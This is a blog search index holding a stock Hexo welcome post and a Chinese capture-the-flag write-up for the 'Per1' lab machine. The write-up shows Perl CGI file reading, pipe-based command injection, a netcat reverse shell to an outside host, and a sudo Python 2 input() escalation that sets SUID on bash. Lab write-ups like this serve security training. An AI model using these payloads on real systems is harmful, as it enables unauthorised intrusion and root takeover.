<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2025/08/07/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>MazeSec-Per1</title>
    <url>/2025/08/09/MazeSec-Per1/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- 192.168.0.107</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 00:31 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.107</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: E6:F4:83:79:2E:CF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.38 seconds</span><br></pre></td></tr></table></figure>

<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>​	开了80和22端口，查看web页面：</p>
<p><img src="image1.png" alt="image1"></p>
<p>​	页面是说，perl是个很优美的编程语言，并且举了一个perl代码的例子，但没有看到别的进一步渗透的信息。</p>
<p>​	那就查看一下源码，发现有一个很特别的提示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- cgi --&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	看到这个<strong>cgi</strong>，很自然就想到cgi-bin这个目录，再通过询问GPT，了解到perl语言如果写cgi脚本，一般文件后缀为cgi、pl，那就拿这两个后缀名爆破一下web页面的cgi-bin目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gobuster <span class="built_in">dir</span>  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://192.168.0.107/cgi-bin -x cgi,pl</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.0.107/cgi-bin</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              cgi,pl</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/file.cgi             (Status: 200) [Size: 22]</span><br></pre></td></tr></table></figure>

<p>​	发现有个file.cgi文件，去访问：</p>
<p><img src="image2.png" alt="image2"></p>
<p>​	他说缺少file参数，想必是个读文件的cgi，那就给他&#x2F;etc&#x2F;passwd，为了方便，采用curl：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">sunset:x:1001:1001:,,,:/home/sunset:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	可以看到返回了&#x2F;etc&#x2F;passwd的内容，而且有个sunset用户是有home目录的。</p>
<p>​	那接下来，可以尝试读取sunset的.bash_history、.ssh&#x2F;id_rsa，但都没有结果。</p>
<p>​	下一步的思路，我是想看看file.cgi这个文件本身的内容是什么，因此我得知道这个cgi-bin目录的确切路径才行。</p>
<p>​	询问GPT，“perl写的cgi文件一般在linux的哪个目录下？”，GPT回答说在 <strong>&#x2F;var&#x2F;www&#x2F;cgi-bin</strong> 或者 <strong>&#x2F;usr&#x2F;lib&#x2F;cgi-bin</strong>，两个都尝试访问，发现file.cgi是在&#x2F;usr&#x2F;lib&#x2F;cgi-bin之下，查看内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=/usr/lib/cgi-bin/file.cgi&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line">use CGI;</span><br><span class="line"><span class="built_in">print</span> CGI::header();</span><br><span class="line">my <span class="variable">$input</span> = CGI::param(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$input</span>) &#123;</span><br><span class="line">    open(FILE, <span class="variable">$input</span>);</span><br><span class="line">    <span class="built_in">print</span> <span class="keyword">while</span> &lt;FILE&gt;;</span><br><span class="line">    close(FILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Missing file parameter&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	由于接触perl不多，上述源代码看上去也没有直接的可利用的地方，我就询问了GPT，问他这个代码有没有危险的地方，他说 <strong>“如果文件名包含管道符 <code>｜</code>或反引号<code>`</code>，perl的open函数可以执行命令，例如：”</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.107/cgi-bin/file.cgi?file=|id|</span><br></pre></td></tr></table></figure>

<p>​	尝试进行命令执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=|id|&#x27;</span> </span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>

<p>​	可以看到执行了id命令，那就进行反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=|busybox nc 192.168.0.104 1234 -e /bin/bash|&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>​	成功反弹了shell，用python3稍微提升一下交互性：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.0.107 45342</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www-data@Per1:/usr/lib/cgi-bin$ </span><br></pre></td></tr></table></figure>

<p>​	在&#x2F;home&#x2F;sunset里找到了user flag:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag&#123;user-5b5b8e9b01ef27a1cc0a2d5fa87d7190&#125;</span><br></pre></td></tr></table></figure>

<p>​	可以常规地在var、opt、home等目录里面找找信息，也可以找一下sunset这个用户的一些文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user sunset 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/opt/password.pl</span><br></pre></td></tr></table></figure>

<p>​	可以找到那个password.pl文件，ls看一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -liah /opt/password.pl</span><br><span class="line"></span><br><span class="line">784900 -rwxr-xr-x 1 sunset sunset 893 Aug  8 09:07 password.pl</span><br></pre></td></tr></table></figure>

<p>​	是sunset拥有的文件，且该文件我们有读取权限，读一下它：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> <span class="variable">@char_generator</span> = (</span><br><span class="line">    </span><br><span class="line">    [<span class="number">103</span>, <span class="number">3</span>],    </span><br><span class="line">    [<span class="number">126</span>, <span class="number">5</span>],    </span><br><span class="line">    [<span class="number">115</span>, <span class="number">7</span>],    </span><br><span class="line">    [<span class="number">98</span>,  <span class="number">1</span>],    </span><br><span class="line">    [<span class="number">112</span>, <span class="number">2</span>],    </span><br><span class="line">    [<span class="number">58</span>,  <span class="number">6</span>],    </span><br><span class="line">    [<span class="number">105</span>, <span class="number">4</span>],    </span><br><span class="line">    [<span class="number">122</span>, <span class="number">4</span>],    </span><br><span class="line">    [<span class="number">102</span>, <span class="number">5</span>]     </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> <span class="variable">@decoy_blocks</span> = (</span><br><span class="line">    &#123;<span class="string">values =&gt;</span> [<span class="number">66</span>, <span class="number">71</span>, <span class="number">77</span>], <span class="string">offsets =&gt;</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">values =&gt;</span> [<span class="number">85</span>, <span class="number">90</span>, <span class="number">95</span>], <span class="string">offsets =&gt;</span> [<span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">values =&gt;</span> [<span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>], <span class="string">offsets =&gt;</span> [<span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>]&#125;  </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">my</span> <span class="variable">$i</span> (<span class="number">0</span>..<span class="number">4</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">my</span> (<span class="variable">$val</span>, <span class="variable">$off</span>) = @&#123;<span class="variable">$char_generator</span>[<span class="variable">$i</span>]&#125;;</span><br><span class="line">        <span class="variable">$output</span> .= <span class="keyword">chr</span>(<span class="variable">$val</span> - <span class="variable">$off</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">my</span> <span class="variable">$noise</span> = <span class="variable">$decoy_blocks</span>[<span class="number">0</span>]<span class="string">&#123;values&#125;</span>[<span class="number">0</span>] - <span class="variable">$decoy_blocks</span>[<span class="number">0</span>]<span class="string">&#123;offsets&#125;</span>[<span class="number">0</span>];</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">my</span> <span class="variable">$j</span> ((<span class="variable">$i</span> == <span class="number">3</span>) ? (<span class="number">3</span>..<span class="number">5</span>) : (<span class="number">6</span>..<span class="number">8</span>)) &#123;</span><br><span class="line">            <span class="keyword">my</span> (<span class="variable">$val</span>, <span class="variable">$off</span>) = @&#123;<span class="variable">$char_generator</span>[<span class="variable">$j</span>]&#125;;</span><br><span class="line">            <span class="variable">$output</span> .= <span class="keyword">chr</span>(<span class="variable">$val</span> - <span class="variable">$off</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">last</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$output</span> . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​	看上去是个perl的代码，简单看一下内容也可以知道，他是在用一些简单的加密的方式输出一个密码，那就干脆找个在线的perl代码运行的网站运行一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.w3cschool.cn/tryrun/runcode?lang=perl5</span><br></pre></td></tr></table></figure>

<p>​	<img src="image3.png" alt="image3"></p>
<p>​	运行的结果是dylan4，这应该就是sunset的密码，切换用户（或者ssh连接）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Per1:/opt$ su sunset</span><br><span class="line">su sunset</span><br><span class="line">Password: dylan4</span><br><span class="line"></span><br><span class="line">sunset@Per1:/opt$</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>​	sudo -l，发现sunset用户可以执行一个python文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> sunset on Per1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User sunset may run the following commands on Per1:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python /usr/bin/guess_game.py</span><br></pre></td></tr></table></figure>

<p>​	看一下guess_game.py的内容:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_game</span>():</span><br><span class="line">    ans = random.randint(<span class="number">0</span>, <span class="number">65535</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Welcome to the guess game!&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;I&#x27;ve chosen a number between 0 and 65535.&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_input = <span class="built_in">input</span>(<span class="string">&quot;Your guess: &quot;</span>)  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error:&quot;</span>, e</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_input == ans:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Congratulations! You guessed it.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Wrong! The correct number was&quot;</span>, ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    guess_game()</span><br></pre></td></tr></table></figure>

<p>​	可以看到是个python2的代码，对于这里的漏洞不太熟悉的朋友，可以问问GPT，当然也可以自己运行看一下。</p>
<p>​	例如，运行之后，我随便输入了一点东西：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to the guess game!</span><br><span class="line">I&#x27;ve chosen a number between 0 and 65535.</span><br><span class="line">Your guess: asd</span><br><span class="line">asd</span><br><span class="line">Error: name &#x27;asd&#x27; is not defined</span><br></pre></td></tr></table></figure>

<p>​	我输入了“asd”，他说” ‘asd’ is not defined”，这里用脚后跟想都绝对有问题，他没有把我的输入当成纯字符串处理，而是当成一个python代码来看。</p>
<p>​	那根据源码，他要比较我输入的东西和<em>ans</em>是否相等，那我就输入ans看一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to the guess game!</span><br><span class="line">I&#x27;ve chosen a number between 0 and 65535.</span><br><span class="line">Your guess: ans</span><br><span class="line">ans</span><br><span class="line">Congratulations! You guessed it.</span><br></pre></td></tr></table></figure>

<p>​	果然，他说我猜对了，那就说明这里应该可以进行命令执行。</p>
<p>​	引入os，执行系统命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/bin/python /usr/bin/guess_game.py</span><br><span class="line"></span><br><span class="line">Welcome to the guess game!</span><br><span class="line">I<span class="string">&#x27;ve chosen a number between 0 and 65535.</span></span><br><span class="line"><span class="string">Your guess: __import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span><span class="built_in">chmod</span> +s /bin/bash<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span><span class="built_in">chmod</span> +s /bin/bash<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">Wrong! The correct number was 39444</span></span><br></pre></td></tr></table></figure>

<p>​	查看&#x2F;bin&#x2F;bash的权限情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -liah /bin/bash</span><br><span class="line"></span><br><span class="line">263242 -rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash</span><br></pre></td></tr></table></figure>

<p>​	可以看到已经加了s权限，用&#x2F;bin&#x2F;bash -p提权就好了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sunset@Per1:/opt$ /bin/bash -p</span><br><span class="line">/bin/bash -p</span><br><span class="line">bash-5.0# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;root-c27679de03aba03c5a33159aef11f8ea&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>perl</tag>
        <tag>python</tag>
        <tag>Maze-Sec</tag>
      </tags>
  </entry>
</search>
